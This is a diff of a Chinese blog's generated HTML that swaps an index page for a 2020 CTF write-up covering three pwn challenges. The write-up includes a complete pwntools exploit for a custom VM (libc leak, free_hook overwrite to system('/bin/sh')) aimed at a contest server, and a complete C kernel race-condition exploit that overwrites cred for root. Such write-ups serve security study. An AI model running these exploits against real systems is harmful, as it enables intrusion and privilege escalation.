@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>MozhuCY&#39;s blog</title>
+    <title>公益CTF · MozhuCY&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >MozhuCY&#39;s blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">公益CTF</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>MozhuCY's blog.</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            公益CTF
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PWN">PWN</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/09</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,138 +399,66 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/1970/01/01/python_pyc/" >
-            
-                <span>Python的一些底层原理</span>
-        </a>
-        <div class="abstract-content">
-            
-踩了太多次坑了,从前几个月的suctf开始,pyc文件逆向越来越多的出现在各种比赛中,正好借这个机会好好熟悉一下Python的底层
-Python的一些底层实现
-python常常被当做是一门解释型语言,但是实际上,Python的底层和java等语言非常相近,都是一门基于虚拟机的语言,当用户在命令行输入python test.py时,实际上进行的是一个编译的过程
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>这两天打了这个,做了几道pwn和逆向</p>
+<h1 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h1><p>一个自定义指令集的VM,逆向可以发现几个功能,分别是输入字节码,执行字节码,gift和退出</p>
+<p>保护全开,不能写got表.gift给了一个leak,可以直接算出地址,这里梳理出流程直接用z3解了,在字节码中,可以看到getchar和putchar没有检测下标啊,任意地址读写了</p>
+<p>直接读malloc的got表,然后leak libcbase,后面直接写free hook为system,然后将R0和R1寄存器写上字符串,触发free</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">def decode(enc):</span><br><span class="line">        print &quot;%x&quot;%enc</span><br><span class="line">        R1 = BitVec(&apos;R1&apos;,32)</span><br><span class="line">        S = Solver()</span><br><span class="line"></span><br><span class="line">        R6 = R1</span><br><span class="line">        R1 &gt;&gt;= 0xD</span><br><span class="line">        R1 ^= R6</span><br><span class="line">        R6 = R1</span><br><span class="line">        R1 &lt;&lt;= 9</span><br><span class="line">        R1 &amp;= 0X78F39600</span><br><span class="line">        R1 ^= R6</span><br><span class="line">        R6 = R1</span><br><span class="line">        R1 &lt;&lt;= 0x11</span><br><span class="line">        R1 &amp;= 0X85D40000</span><br><span class="line">        R1 ^= R6</span><br><span class="line">        R6 = R1</span><br><span class="line">        R1 &gt;&gt;= 0X13</span><br><span class="line">        R1 ^= R6</span><br><span class="line"></span><br><span class="line">        S.add(R1 == enc)</span><br><span class="line"></span><br><span class="line">        if S.check() == sat:</span><br><span class="line">                R1 = BitVec(&apos;R1&apos;,32)</span><br><span class="line">                return S.model()[R1].as_long()</span><br><span class="line">        else:</span><br><span class="line">                return 0;</span><br><span class="line"></span><br><span class="line">#r = process(&quot;./EasyVM.bak&quot;)</span><br><span class="line">r = remote(&quot;121.36.215.224&quot;,9999)</span><br><span class="line"></span><br><span class="line">def sa(a,b):</span><br><span class="line">        r.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">sa(&quot;&gt;&gt;&gt; &quot;,&quot;4&quot;)</span><br><span class="line">sa(&quot;&gt;&gt;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">r.recvline()</span><br><span class="line">start =  decode(int(r.recvline(10),16))</span><br><span class="line"></span><br><span class="line">if (start &amp; 0xfff) == 0x6c0:</span><br><span class="line">        log.success(&quot;[*] start:0x%x&quot;%start)</span><br><span class="line">        malloc_got = start + 0x290c</span><br><span class="line">        opcode = chr(0x80) + chr(3) + p32(malloc_got) # MOV R3 mallocgot</span><br><span class="line">        opcode += chr(0x53) + chr(0xff) # putchar R3</span><br><span class="line">        opcode += chr(0x80) + chr(3) + p32(malloc_got + 1) # MOV R3 mallocgot + 1</span><br><span class="line">        opcode += chr(0x53) + chr(0xff) # putchar R3</span><br><span class="line">        opcode += chr(0x80) + chr(3) + p32(malloc_got + 2) # MOV R3 mallocgot + 2</span><br><span class="line">        opcode += chr(0x53) + chr(0xff) # putchar R3</span><br><span class="line">        opcode += chr(0x80) + chr(3) + p32(malloc_got + 3) # MOV R3 mallocgot + 3</span><br><span class="line">        opcode += chr(0x53) + chr(0xff) # putchar R3</span><br><span class="line">        opcode += chr(0x99)</span><br><span class="line">        sa(&quot;&gt;&gt;&gt; &quot;,&quot;1&quot;)</span><br><span class="line">        #raw_input()</span><br><span class="line">        r.sendline(opcode)</span><br><span class="line"></span><br><span class="line">        sa(&quot;&gt;&gt;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">        print r.recv()</span><br><span class="line">        malloc_addr = u32(r.recv(1) + r.recv(1) + r.recv(1) + r.recv(1))</span><br><span class="line">        log.success(&quot;[*] malloc_addr:0x%x&quot;%malloc_addr);</span><br><span class="line">        libc_addr = malloc_addr - 0x70f00</span><br><span class="line">        log.success(&quot;[*] libc_addr:0x%x&quot;%libc_addr);</span><br><span class="line"></span><br><span class="line">        free_hook =  0x1b38b0 + libc_addr</span><br><span class="line"></span><br><span class="line">        opcode = chr(0x80) + chr(3) + p32(free_hook)</span><br><span class="line">        opcode += chr(0x54) + chr(0xff)</span><br><span class="line">        opcode += chr(0x80) + chr(3) + p32(free_hook + 1)</span><br><span class="line">        opcode += chr(0x54) + chr(0xff)</span><br><span class="line">        opcode += chr(0x80) + chr(3) + p32(free_hook + 2)</span><br><span class="line">        opcode += chr(0x54) + chr(0xff)</span><br><span class="line">        opcode += chr(0x80) + chr(3) + p32(free_hook + 3)</span><br><span class="line">        opcode += chr(0x54) + chr(0xff)</span><br><span class="line">        opcode += chr(0x80) + chr(0) + p32(u32(&quot;/bin&quot;))</span><br><span class="line">        opcode += chr(0x80) + chr(1) + p32(u32(&quot;/sh\x00&quot;))</span><br><span class="line">        opcode += chr(0x99)</span><br><span class="line"></span><br><span class="line">        sa(&quot;&gt;&gt;&gt; &quot;,&quot;1&quot;)</span><br><span class="line">        r.sendline(opcode)</span><br><span class="line"></span><br><span class="line">        sa(&quot;&gt;&gt;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">        r.send(p32(libc_addr + 0x3ada0))</span><br><span class="line"></span><br><span class="line">        r.interactive()</span><br><span class="line">        #print r.recv().encode(&quot;hex&quot;)</span><br><span class="line">else:</span><br><span class="line">        exit(0)</span><br></pre></td></tr></table></figure>
+<h1 id="Kernoob"><a href="#Kernoob" class="headerlink" title="Kernoob"></a>Kernoob</h1><p>一个内核pwn,可以看到有一个基本堆题的功能,但是限制了size,kfree存在一个UAF,但是大小不够cred的</p>
+<p> cpio -idmv &lt; test.cpio解包,进到init.d改一下启动文件,方便调试</p>
+<p> find ./* | cpio -H newc -o &gt; test.cpio 写回cpio.</p>
+<p>/proc/modules 找基址 调试</p>
+<p>add-symbol-file ~/Desktop/noob.ko 0xffffffffc0002000</p>
+<p>发现断下来后也没啥用…后来发现这玩意申请了两个core,考虑一下double fetch,但是好像打不通啊….概率太低了,等一个wp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line"></span><br><span class="line">int fd1,fd2;</span><br><span class="line"></span><br><span class="line">struct node</span><br><span class="line">&#123;</span><br><span class="line">	uint64_t index;</span><br><span class="line">	uint64_t data_ptr;</span><br><span class="line">	uint64_t size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int new(int fd,struct node * n)</span><br><span class="line">&#123;</span><br><span class="line">	return ioctl(fd,0x30000,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int del(int fd,uint64_t index)</span><br><span class="line">&#123;</span><br><span class="line">	struct node n;</span><br><span class="line">	n.index = index;</span><br><span class="line">	n.size = 0;</span><br><span class="line">	n.data_ptr = NULL;</span><br><span class="line">	return ioctl(fd,0x30001,&amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int  edit(int fd,uint64_t index,uint64_t ptr,uint64_t size)</span><br><span class="line">&#123;</span><br><span class="line">	struct node n;</span><br><span class="line">	n.index = index;</span><br><span class="line">	n.size = size;</span><br><span class="line">	n.data_ptr = ptr;</span><br><span class="line">	return ioctl(fd,0x30002,&amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int  show(int fd,uint64_t index,uint64_t ptr,uint64_t size)</span><br><span class="line">&#123;</span><br><span class="line">	struct node n;</span><br><span class="line">	n.index = index;</span><br><span class="line">	n.size = size;</span><br><span class="line">	n.data_ptr = ptr;</span><br><span class="line">	return ioctl(fd,0x30003,&amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int finish = 0;</span><br><span class="line">void changesize(void * ptr)</span><br><span class="line">&#123;</span><br><span class="line">	struct node * p = (struct node *)ptr;</span><br><span class="line"></span><br><span class="line">	while(!finish)</span><br><span class="line">	&#123;</span><br><span class="line">		p-&gt;size = 0xa8;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char  buf[0x100] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	pthread_t t1,t2;</span><br><span class="line">	fd1 = open(&quot;/dev/noob&quot;,O_RDWR);</span><br><span class="line">	fd2 = open(&quot;/dev/noob&quot;,O_RDWR);</span><br><span class="line">	assert(fd1 &gt;= 0);</span><br><span class="line">	assert(fd2 &gt;= 0);</span><br><span class="line">	puts(&quot;[*]race condition&quot;);</span><br><span class="line">	struct node n;</span><br><span class="line">        n.index = 0;</span><br><span class="line">        n.size = 0x68;</span><br><span class="line">        n.data_ptr = 0;</span><br><span class="line"></span><br><span class="line">	pthread_create(&amp;t1, NULL,changesize,&amp;n);</span><br><span class="line"></span><br><span class="line">	for (int i=0;i&lt;0x20;i++) &#123;</span><br><span class="line">		n.size = 0x68;</span><br><span class="line">		n.index = i;</span><br><span class="line">		if(new(fd1,&amp;n) == -1)</span><br><span class="line">		&#123;</span><br><span class="line">			i -= 1;</span><br><span class="line">		&#125;</span><br><span class="line">   	&#125;</span><br><span class="line">   	finish = 1;</span><br><span class="line">   	pthread_join(t1, NULL);</span><br><span class="line"></span><br><span class="line">	memset(buf,0x41,0xa8);</span><br><span class="line">	for(int i=0;i &lt; 0x20;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if(edit(fd1,0,buf,0xa8) != -1)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;GET IT:%d\n&quot;,i);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;GG\n&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	del(fd1,0);</span><br><span class="line">	</span><br><span class="line">	puts(&quot;[*]fork&quot;);</span><br><span class="line">   	int pid = fork();</span><br><span class="line">   	if (pid &lt; 0) &#123;</span><br><span class="line">      		printf(&quot;[-]fork error!!\n&quot;);</span><br><span class="line">      		exit(-1);</span><br><span class="line">   	&#125; </span><br><span class="line">	else if (pid == 0) </span><br><span class="line">	&#123;</span><br><span class="line">		char buf[28];</span><br><span class="line">      		memset(buf,0,28);</span><br><span class="line">      		edit(fd2,0,buf,28);</span><br><span class="line">      		if (getuid() == 0) </span><br><span class="line">		&#123;</span><br><span class="line">         		printf(&quot;[+]rooted!!\n&quot;);</span><br><span class="line">         		system(&quot;/bin/sh&quot;);</span><br><span class="line">      		&#125;</span><br><span class="line">   	&#125; 	</span><br><span class="line">   	else </span><br><span class="line">   	&#123;</span><br><span class="line">      		wait(NULL);</span><br><span class="line">   	&#125;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="easy-unicorn"><a href="#easy-unicorn" class="headerlink" title="easy_unicorn"></a>easy_unicorn</h1><p>用unicorn跑了一个程序,要我们pwn这个文件,总体实现还是可以理解的,但是卡在了恢复文件的过程中</p>
 
-.pyc也就是Python编译好的文件,在一般情况下,编译出的字节码是存在于内存中的,当Python运行结束后,就会释放掉内存,或者写入.pyc文件,被我们看到,如果这个时候再次运行.py文件,python解释器会先在目录下中查...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">1970/01/01</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/1970/01/01/homuranote/" >
-            
-                <span>Homuranote</span>
-        </a>
-        <div class="abstract-content">
-            cgctf pwn300大概审查思路
-据说这题是入门堆题,又是校队考核题目,入门一发堆吧
-很经典的note结构,menu getnum switch-case选择功能
-checksec 查一下,能开的都开了.
-IDA打开后反编译,程序大概有5个功能,新建,删除,编辑,查看,退出
-新建堆处很正常
-删除堆,也就是free处,存在UAF
-编辑处可以修改堆内的值
-
-具体攻击思路
-fastbin attack劫持 _mallochook
-unsorted bin leak 程序基址
-配合给好的libc文件进行攻击
-
-具体攻击原理fastbin atacck
-一般利用double...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://mozhucy.cn">MozhuCY</a>
+            <p>原文链接：<a href="http://mozhucy.cn/2020/03/09/gongyi/">http://mozhucy.cn/2020/03/09/gongyi/</a>
+            <p>发表日期：<a href="http://mozhucy.cn/2020/03/09/gongyi/">March 9th 2020, 11:26:49 am</a>
+            <p>更新日期：<a href="http://mozhucy.cn/2020/03/09/gongyi/">March 9th 2020, 4:16:14 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">1970/01/01</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/1970/01/01/malloc源码精读总结/" >
-            
-                <span>malloc源码精读总结</span>
-        </a>
-        <div class="abstract-content">
-            之前草草读过一次源码以及华庭的源码分析,最近又有一些生疏了,决定用几周的时间精读一下
-一些个人对特性的总结理解__libc_malloc
-malloc执行的开始
-
-12345678910void *__libc_malloc (size_t bytes) &#123;  mstate ar_ptr;  void *victim;  void *(*hook) (size_t, const void *)     = atomic_forced_read (__malloc_hook);  if (__builtin_expect (hook != NULL, 0))    return ...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">1970/01/01</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/1970/01/01/cve-2015-7504/" >
-            
-                <span>CVE-2015-7504 CVE-2015-5165QEMU虚拟机逃逸漏洞分析</span>
-        </a>
-        <div class="abstract-content">
-            QEMU
-QEMU是一套模拟处理器,在Linux平台上使用广泛,一般虚拟机的漏洞分为两大类,DoS和逃逸,其中逃逸的漏洞威胁最大,但是挖掘难度也很大.
-漏洞多出现于IO部分的模拟,因为交互需要许多长度未定的数据,所以在数据处理的代码中,往往会出现一些类似于溢出的漏洞,一般通过这些溢出,就能达到使虚拟机crash的目的
-
-分析目的
-这里想要通过已经给出POC的漏洞,以及qemu开源的优势来熟悉虚拟机漏洞的成因以及原理,方便以后对于不同种类虚拟机的漏洞挖掘
-
-环境搭建
-卡在这里好久,一直是VNC server running on 127.0.0.1:5900,缺少SDL库,一开始按照网上的...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">1970/01/01</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/9102/07/29/杂谈/" title= "写在前面">
+                    <div class="nextTitle">写在前面</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/03/socket/" title= "CVE-2019-6778">
+                    <div class="prevTitle">CVE-2019-6778</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/1970/page/5/">&#60; PREV</a><a class="page-number" href="/archives/1970/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/1970/page/4/">4</a><a class="page-number" href="/archives/1970/page/5/">5</a><span class="page-number current">6</span>
-    </nav>
     
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -554,6 +543,24 @@ QEMU是一套模拟处理器,在Linux平台上使用广泛,一般虚拟机的漏
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EasyVM"><span class="toc-number">1.</span> <span class="toc-text">EasyVM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kernoob"><span class="toc-number">2.</span> <span class="toc-text">Kernoob</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-unicorn"><span class="toc-number">3.</span> <span class="toc-text">easy_unicorn</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -3161,6 +3168,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     <script type="text/x-mathjax-config">
     MathJax.Hub.Config({
